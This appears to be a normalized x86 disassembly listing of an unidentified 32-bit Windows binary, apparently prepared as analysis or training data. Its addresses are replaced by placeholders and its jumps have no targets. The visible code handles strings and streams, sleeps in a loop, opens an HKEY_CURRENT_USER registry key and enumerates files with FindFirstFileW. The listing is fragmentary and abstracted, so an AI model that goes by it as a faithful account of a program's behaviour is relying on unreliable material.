and esp 0xfffffff8
push 0xffffffff
push sub_10051c78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x20 ]
xor edi edi
cmp eax edi
je r-xdata
push 0x44
call sub_1002738b
pop ecx
mov [ esp + 0xc ] eax
mov [ esp + 0x60 ] 0x1
cmp eax edi
je r-xdata
push r--data
lea ecx [ esp + 0x14 ]
call sub_10001ebc
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x64 ] edi
call sub_10001eec
push r--data
lea eax [ esp + 0x30 ]
push eax
call sub_1002ae74
or [ esp + 0x60 ] 0xffffffff
mov ecx [ esi + 0x20 ]
cmp edi ecx
je r-xdata
lea ecx [ esi + 0x4 ]
push ecx
push eax
call sub_10016eb3
mov edi eax
mov [ esi + 0x20 ] edi
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000d5e0
push 0x1c
mov eax sub_10050c63
call sub_1002b2a6
mov esi ecx
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx esi
call [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
call sub_1002b37e
retn 0x4
sub_1000d621
push 0x1c
mov eax sub_10050c63
call sub_1002b2a6
mov esi ecx
push 0x0
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x10 ] 0xf
call sub_100021a7
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x28 ]
push ecx
push [ ebp + 0x8 ]
mov ecx esi
call [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
call sub_1002b37e
retn 0x4
sub_1000d666
push ecx
push ecx
and [ esp + 0x4 ] 0x0
push ebx
mov ebx ecx
mov ecx [ eax + 0x20 ]
test ecx ecx
jne r-xdata
push ebx
push ecx
call sub_10016f89
lea ecx [ eax + 0x4 ]
call sub_10016e42
jmp r-xdata
mov eax ebx
pop ebx
pop ecx
pop ecx
retn
sub_1000d68e
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10051ef3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov eax ecx
lea ecx [ esp + 0x18 ]
call sub_1000d666
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ esp + 0x48 ] ebx
mov eax [ edi + 0x14 ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
push [ esp + 0x1c ]
push 0x4
pop esi
call sub_1001717b
mov esi [ esp + 0x14 ]
cmp esi ebx
jle r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esp + 0x1c ]
mov [ esp + 0x18 ] ebx
push 0x4
pop esi
call sub_10017217
push [ esp + 0x10 ]
lea esi [ esp + 0x24 ]
call sub_1000d8d3
mov esi [ ebp + 0xc ]
push 0xffffffff
push ebx
push eax
mov ecx esi
mov [ esp + 0x54 ] 0x1
call sub_100021c3
push ebx
push 0x1
lea ecx [ esp + 0x28 ]
mov [ esp + 0x50 ] bl
call sub_100020e2
cmp [ esp + 0x10 ] ebx
jle r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
or [ esp + 0x48 ] 0xffffffff
mov ecx [ esp + 0x1c ]
cmp ecx ebx
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_1000af0a
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push edi
push [ esp + 0x1c ]
call sub_1001717b
push esi
push [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
call sub_10017217
sub_1000d794
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10051ebb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov eax ecx
lea ecx [ esp + 0x14 ]
call sub_1000d666
lea eax [ esp + 0x10 ]
push eax
xor ebx ebx
mov [ esp + 0x6c ] ebx
push [ esp + 0x18 ]
mov [ esp + 0x18 ] ebx
push 0x4
pop esi
call sub_10017217
push [ esp + 0x10 ]
lea esi [ esp + 0x40 ]
call sub_1000d8d3
mov [ esp + 0x68 ] 0x1
mov esi [ esp + 0x10 ]
cmp esi ebx
jle r-xdata
push ebx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x3c ] 0xf
call sub_100021a7
lea ecx [ esp + 0x20 ]
push ecx
lea ecx [ esp + 0x40 ]
mov [ esp + 0x6c ] 0x2
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
mov eax [ esp + 0x34 ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x1c ]
push eax
push [ esp + 0x18 ]
push 0x4
pop esi
call sub_1001717b
mov esi [ esp + 0x1c ]
cmp esi ebx
jle r-xdata
cmp [ esp + 0x54 ] 0x10
mov eax [ esp + 0x40 ]
jae r-xdata
push ebx
push 0x1
lea ecx [ esp + 0x28 ]
call sub_100020e2
push ebx
push 0x1
lea ecx [ esp + 0x44 ]
call sub_100020e2
or [ esp + 0x68 ] 0xffffffff
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
cmp [ esp + 0x38 ] 0x10
mov eax [ esp + 0x24 ]
jae r-xdata
push eax
push [ esp + 0x18 ]
call sub_10017217
lea eax [ esp + 0x40 ]
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn 0x4
call sub_1000af0a
push eax
push [ esp + 0x18 ]
call sub_1001717b
lea eax [ esp + 0x24 ]
sub_1000d911
push 0x4
mov eax sub_10051e88
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x18 ]
push eax
call sub_10009555
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1000d4bd
call sub_1002b37e
retn
sub_1000d946
push 0x44
mov eax sub_100512ed
call sub_1002b2a6
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ esi + 0x18 ]
call sub_1000b923
push [ ebp + 0x8 ]
call sub_10014945
mov al [ esi + 0x10 ]
test al al
jne r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001eec
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_1002ae74
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
push esi
call sub_10014945
call sub_1002b37e
retn 0x8
call sub_1000af0a
sub_1000d9c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
push ebx
push esi
push edi
lea edi [ ecx + 0x18 ]
call sub_10027827
cmp eax [ esp + 0x28 ]
je r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea esi [ esp + 0x18 ]
call sub_1000957d
mov eax [ eax ]
cmp [ eax + 0x50 ] 0x1
jne r-xdata
mov eax [ esp + 0x1c ]
cmp eax [ esp + 0x2c ]
je r-xdata
mov ebx [ edi + 0xc ]
lea esi [ esp + 0x20 ]
call sub_1000986e
mov eax [ esp + 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] eax
lea esi [ esp + 0x18 ]
call sub_100095a5
jmp r-xdata
mov al [ eax + 0x11 ]
cmp al 0x1
je r-xdata
mov ebx [ edi + 0x10 ]
lea esi [ esp + 0x28 ]
call sub_1000986e
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
mov eax [ edi + 0x10 ]
lea ebx [ ecx + 0x8 ]
mov [ esp + 0x10 ] eax
cmp ebx eax
je r-xdata
mov eax [ edi + 0x10 ]
push eax
add eax 0xfffffff8
call sub_10009849
mov ebx [ esp + 0x1c ]
add [ edi + 0x10 ] 0xfffffff8
lea esi [ esp + 0x10 ]
call sub_1000986e
mov [ esp + 0xc ] ecx
sub [ esp + 0xc ] ebx
mov eax [ esp + 0xc ]
lea esi [ eax + ebx ]
mov eax ebx
call sub_10017055
add ebx 0x8
cmp ebx [ esp + 0x10 ]
jne r-xdata
sub_1000dabf
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10053433
mov eax [ fs : 0x0 ]
push eax
sub esp 0x180
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x178 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x190 ]
mov [ fs : 0x0 ] eax
push r--data
lea ecx [ esp + 0x40 ]
call sub_10001362
xor ebx ebx
push r--data
lea ecx [ esp + 0x5c ]
mov [ esp + 0x19c ] ebx
call sub_10001362
lea eax [ esp + 0x3c ]
push eax
lea eax [ esp + 0x5c ]
push eax
push 0x80000001
lea eax [ esp + 0x150 ]
push eax
mov [ esp + 0x1a8 ] 0x1
call sub_10014a6c
push ebx
push 0x1
lea ecx [ esp + 0x60 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ esp + 0x44 ]
mov [ esp + 0x1a0 ] 0x4
call sub_1000264e
mov esi r--data
push esi
lea ecx [ esp + 0x24 ]
call sub_10001362
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x148 ]
push eax
mov [ esp + 0x1a0 ] 0x5
call sub_10014fe0
push ebx
push 0x1
lea ecx [ esp + 0x28 ]
mov [ esp + 0x1f ] al
mov [ esp + 0x1a0 ] 0x4
call sub_1000264e
cmp [ esp + 0x17 ] bl
jne r-xdata
lea ecx [ esp + 0x144 ]
call sub_10014b74
xor eax eax
mov ecx [ esp + 0x190 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x178 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x9c ]
push eax
call sub_1000313a
lea eax [ esp + 0xa4 ]
mov [ esp + 0x18 ] r--data
mov [ esp + 0x1c ] eax
lea edi [ esp + 0x18 ]
mov [ esp + 0x198 ] 0x7
call sub_10010ea8
lea ecx [ esp + 0x128 ]
lea eax [ esp + 0x9c ]
call sub_10003269
mov [ esp + 0x198 ] 0x8
cmp [ esp + 0x140 ] 0x8
mov eax [ esp + 0x12c ]
jae r-xdata
mov ecx [ esp + 0x13c ]
add ecx ecx
push ecx
push eax
lea ecx [ esp + 0x174 ]
call sub_1000dd07
lea eax [ esp + 0x16c ]
push eax
mov [ esp + 0x19c ] 0x9
call sub_1000e07d
pop ecx
push esi
lea ecx [ esp + 0x24 ]
call sub_10001362
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x78 ]
push eax
mov [ esp + 0x1a0 ] 0xa
call sub_1001525d
pop ecx
pop ecx
lea ecx [ esp + 0x144 ]
push ecx
mov ecx eax
mov [ esp + 0x19c ] 0xb
call sub_10014f5b
lea esi [ esp + 0x74 ]
mov [ esp + 0x198 ] 0xa
call sub_100150b1
push ebx
push 0x1
lea ecx [ esp + 0x28 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ esp + 0x174 ]
call sub_100020e2
push ebx
push 0x1
lea ecx [ esp + 0x130 ]
call sub_1000264e
lea eax [ esp + 0x9c ]
mov [ esp + 0x18 ] r--data
mov [ esp + 0x198 ] 0x4
call sub_10002793
lea eax [ esp + 0x12c ]
sub_1000dd2d
push 0x0
mov eax sub_10050998
call sub_1002b2a6
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_100025cf
push 0x0
push 0x1
lea ecx [ ebp + 0x8 ]
call sub_1000264e
mov eax esi
call sub_1002b37e
retn 0x1c
sub_1000dd94
push 0x2e4
mov eax sub_10051c3e
call sub_1002b30f
xor esi esi
push r--data
lea ecx [ ebp - 0x2d4 ]
mov [ ebp - 0x2b4 ] edi
mov [ ebp - 0x2a0 ] esi
call sub_10001362
lea eax [ ebp - 0x4c ]
push eax
lea ebx [ ebp - 0x2d4 ]
mov [ ebp - 0x4 ] 0x1
call sub_10015bc4
pop ecx
xor ebx ebx
push esi
inc ebx
push ebx
lea ecx [ ebp - 0x2d4 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000264e
push r--data
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x2f0 ]
push eax
call sub_100098f3
push r--data
push eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_100098f3
add esp 0x18
push esi
push ebx
lea ecx [ ebp - 0x2f0 ]
mov [ ebp - 0x4 ] 0x6
call sub_1000264e
push 0x24c
lea eax [ ebp - 0x298 ]
push esi
push eax
mov [ ebp - 0x29c ] 0x250
call sub_10027650
mov eax [ ebp - 0x2c ]
add esp 0xc
cmp [ ebp - 0x18 ] 0x8
jae r-xdata
lea ecx [ ebp - 0x29c ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x2b0 ] eax
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp - 0x2c ]
push 0x20
call sub_1002738b
pop ecx
mov [ ebp - 0x2ac ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax esi
je r-xdata
mov [ edi ] esi
mov [ edi + 0x4 ] esi
push esi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_1000264e
push esi
push ebx
jmp r-xdata
xor ebx ebx
push r--data
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x2d4 ]
push eax
call sub_100098f3
sub esp 0x10
mov ecx esp
mov [ ebp - 0x2b8 ] esp
lea edx [ ebp - 0x270 ]
push edx
push eax
mov [ ebp - 0x4 ] 0x8
push ecx
mov [ ebp - 0x2a0 ] 0x2
call sub_100098f3
mov esi [ ebp - 0x2ac ]
add esp 0xc
call sub_1000dd2d
mov ebx eax
xor esi esi
jmp r-xdata
lea ecx [ ebp - 0x4c ]
call sub_1000264e
mov eax edi
call sub_1002b392
retn
push [ ebp - 0x2b0 ]
call [ FindClose@IAT ]
mov eax [ ebp - 0x2a8 ]
mov [ edi ] eax
lea eax [ ebp - 0x2a4 ]
push eax
lea ecx [ edi + 0x4 ]
call sub_1000af36
mov ecx [ ebp - 0x2a4 ]
or [ ebp - 0x2a0 ] 0x1
cmp ecx esi
je r-xdata
and [ ebp - 0x2a0 ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x2d4 ]
call sub_1000264e
mov [ ebp - 0x4 ] 0x9
push ebx
lea ecx [ ebp - 0x2a4 ]
mov [ ebp - 0x2a8 ] ebx
call sub_1000f0c3
push ebx
lea eax [ ebp - 0x2a8 ]
push ebx
push eax
call sub_1000d3de
add esp 0xc
mov [ ebp - 0x4 ] 0x6
test [ ebp - 0x2a0 ] 0x2
je r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000264e
push esi
push 0x1
call sub_1000af0a
sub_1000df90
push 0xb4
mov eax sub_1005248d
call sub_1002b2a6
mov esi ecx
xor ebx ebx
mov ecx edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x10 ] ebx
call sub_100082a7
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x1c ] 0x8
mov [ ebp - 0x10 ] 0x1
jb r-xdata
add esi 0x8
mov esi [ esi + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0x4 ] bl
call sub_1000e061
mov eax edi
call sub_1002b37e
retn
lea esi [ ebp - 0xa8 ]
call sub_1000e1e8
lea esi [ ebp - 0xc0 ]
lea eax [ ebp - 0xa8 ]
call sub_1000e257
mov esi [ eax + 0x8 ]
add esi [ eax ]
sub esp 0x18
mov eax esp
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
lea ebx [ ebp - 0xa8 ]
mov [ ebp - 0x14 ] esp
call sub_1000e169
push 0x0
push esi
mov ecx edi
call sub_1000133e
cmp [ edi + 0x18 ] 0x10
jb r-xdata
push esi
lea eax [ ebp - 0xa8 ]
push eax
push 0x20
pop ecx
call sub_1000e28c
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x54 ] ebx
je r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0xa8 ]
push eax
call sub_1000bf77
xor ebx ebx
sub_1000e07d
push 0x108
mov eax sub_10051e58
call sub_1002b30f
mov eax [ ebp + 0x8 ]
push r--data
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x50 ] eax
call sub_10001362
lea eax [ ebp - 0x4c ]
xor esi esi
push eax
lea ebx [ ebp - 0x6c ]
mov [ ebp - 0x4 ] esi
call sub_10015bc4
pop ecx
push esi
push 0x1
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_1000264e
lea ecx [ ebp - 0x4c ]
lea ebx [ ebp - 0x88 ]
call sub_10015d8f
push r--data
push eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_100098f3
add esp 0xc
push esi
push 0x1
mov ecx ebx
mov [ ebp - 0x4 ] 0x5
call sub_1000264e
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push eax
lea eax [ ebp - 0x114 ]
push eax
push 0x22
pop ecx
call sub_1000ea44
push [ ebp - 0x50 ]
lea eax [ ebp - 0x114 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_1000ee0f
pop ecx
pop ecx
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0x5
call sub_1000e14d
push esi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000264e
push esi
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_1000264e
call sub_1002b392
retn
lea eax [ ebp - 0x2c ]
sub_1000e169
push ebp
mov ebp esp
mov eax [ ebx ]
mov edx [ eax + 0x4 ]
sub esp 0x18
push esi
push edi
push 0x6
pop ecx
test [ edx + ebx + 0x8 ] cl
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
add eax ebx
mov ecx [ eax + 0x28 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffc
add ecx 0x4
push 0x1
sub esp 0x18
mov edi esp
mov eax edx
mov eax [ eax + ebx + 0x28 ]
mov edx [ eax ]
lea esi [ ebp + 0x8 ]
[ edi ] [ esi ]
lea ecx [ ebp - 0x18 ]
push ecx
mov ecx eax
call [ edx + 0x28 ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
add ecx eax
cmp ecx [ r--data ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
add eax ebx
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_100080a5
pop edi
mov eax ebx
pop esi
leave
retn 0x18
or ecx 0x4
jmp r-xdata
sub_1000e1e8
push ebp
mov ebp esp
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
sub esp 0x18
test [ ecx + esi + 0x8 ] 0x6
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x28 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffc
add ecx 0x4
push 0x1
mov eax ecx
mov ecx [ eax + esi + 0x28 ]
mov eax [ ecx ]
push 0x2
push 0x0
lea edx [ ebp - 0x18 ]
push edx
call [ eax + 0x24 ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
add ecx eax
cmp ecx [ r--data ]
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_100080a5
mov eax esi
leave
retn
or ecx 0x4
jmp r-xdata
sub_1000e257
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add eax ecx
test [ eax + 0x8 ] 0x6
jne r-xdata
mov eax [ r--data ]
mov [ esi ] eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov eax [ eax + 0x28 ]
mov edx [ eax ]
push 0x1
push 0x1
push 0x0
push esi
mov ecx eax
call [ edx + 0x24 ]
jmp r-xdata
mov eax esi
retn
sub_1000e28c
push 0x4
mov eax sub_10051bac
call sub_1002b2a6
mov ebx ecx
mov edi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ edi ] r--data
mov [ edi + 0x58 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x8 ]
push esi
push edi
mov [ ebp - 0x10 ] 0x1
call sub_1000c160
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
push esi
mov [ edi + eax ] r--data
call sub_1000c19c
mov eax esi
mov [ esi ] r--data
mov [ esi + 0x48 ] 0x0
mov [ esi + 0x41 ] 0x0
call sub_1000c55f
mov eax [ rw-data ]
and [ esi + 0x4c ] 0x0
and [ esi + 0x3c ] 0x0
mov [ esi + 0x44 ] eax
or ebx 0x1
push ebx
push [ ebp + 0xc ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_1000eba2
test eax eax
jne r-xdata
mov eax edi
call sub_1002b37e
retn 0x8
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x0
push eax
call sub_100080a5
or ecx 0x4
sub_1000e33f
push 0x4
mov eax sub_1004fdeb
call sub_1002b2a6
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x58 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x58 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x50 ]
mov ecx esi
call sub_1000e37e
mov eax [ esi - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x8 ] r--data
call sub_1002b37e
retn
sub_1000e37e
push 0x4
mov eax sub_1004fdc5
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x48 ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1000d27a
call sub_1002b37e
retn
mov eax esi
call sub_1000ec1c
sub_1000e3b7
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fd95
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov esi ecx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
xor edi edi
cmp ecx edi
je r-xdata
xor eax eax
mov eax [ esi + 0x4c ]
cmp eax edi
jne r-xdata
mov eax [ esi + 0x34 ]
mov edx [ eax ]
add edx ecx
cmp ecx edx
jae r-xdata
cmp [ esi + 0x3c ] edi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
dec [ eax ]
mov esi [ esi + 0x24 ]
mov eax [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov [ eax ] bl
push edi
push 0x8
lea ecx [ esp + 0x4c ]
mov [ esp + 0x1b ] bl
call sub_10005cd0
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x48 ]
mov [ esp + 0x74 ] edi
call sub_10008213
mov ecx eax
call sub_10006ccf
mov edi [ esp + 0x58 ]
mov ebx eax
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10008213
mov ecx eax
call sub_10006ccf
lea edx [ esp + 0x18 ]
add edi ebx
push edx
lea ebx [ esi + 0x44 ]
jmp r-xdata
push eax
movsx eax bl
push eax
call sub_100295c6
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
push edi
push eax
lea edx [ esp + 0x28 ]
push edx
lea edx [ esp + 0x24 ]
push edx
lea edx [ esp + 0x27 ]
push edx
mov [ esp + 0x2c ] eax
mov eax [ ecx ]
push ebx
call [ eax + 0x14 ]
test eax eax
jge r-xdata
jmp r-xdata
cmp eax 0x1
jg r-xdata
or esi 0xffffffff
mov eax ebx
jmp r-xdata
cmp eax 0x3
jne r-xdata
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10008213
mov ecx eax
call sub_10006ccf
mov edi [ esp + 0x18 ]
sub edi eax
je r-xdata
movsx eax [ esp + 0x13 ]
push [ esi + 0x4c ]
push eax
call sub_100295c6
or esi 0xffffffff
pop ecx
pop ecx
cmp eax esi
je r-xdata
lea eax [ esp + 0x13 ]
mov [ esi + 0x41 ] 0x1
cmp [ esp + 0x1c ] eax
jne r-xdata
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10008213
mov ecx eax
call sub_10006ccf
push [ esi + 0x4c ]
push edi
push 0x1
push eax
call sub_10029834
add esp 0x10
cmp edi eax
jne r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x4c ]
call sub_100020e2
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
test edi edi
ja r-xdata
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10008213
mov ecx eax
call sub_10006ccf
mov edi [ esp + 0x58 ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10008213
mov ecx eax
call sub_10006ccf
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x24 ]
add edi edx
cmp [ esp + 0x58 ] 0x20
jae r-xdata
push 0x0
push 0x8
lea ecx [ esp + 0x4c ]
call sub_100014aa
sub_1000e5d0
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
push ebx
mov ebx [ esp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ecx + 0x4c ]
test eax eax
je r-xdata
mov edx [ ecx + 0x10 ]
cmp [ edx ] eax
jae r-xdata
or eax 0xffffffff
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp [ ecx + 0x3c ] 0x0
jne r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov ecx [ ecx + 0x20 ]
dec [ ecx ]
mov eax ebx
inc eax
neg eax
sbb eax eax
and eax ebx
jmp r-xdata
movzx eax [ eax - 0x1 ]
cmp eax ebx
jne r-xdata
push eax
movzx eax bl
push eax
call sub_100299a7
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
pop ebx
retn 0x4
mov eax ebx
jmp r-xdata
sub_1000e635
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x14 ]
mov edi eax
or eax 0xffffffff
cmp edi eax
je r-xdata
mov edx [ esi + 0x30 ]
mov eax [ eax ]
mov edx [ edx ]
add edx eax
cmp eax edx
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x8 ]
mov eax edi
movzx eax [ ecx ]
pop esi
retn
sub_1000e671
push 0x58
mov eax sub_1004fcba
call sub_1002b30f
mov esi ecx
mov eax [ esi + 0x20 ]
mov eax [ eax ]
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0x4c ]
cmp eax edi
jne r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x30 ]
mov eax [ eax ]
mov ecx [ ecx ]
add ecx eax
cmp eax ecx
jae r-xdata
cmp [ esi + 0x3c ] edi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov esi [ esi + 0x20 ]
mov eax [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
movzx eax [ eax ]
push edi
lea ecx [ ebp - 0x2c ]
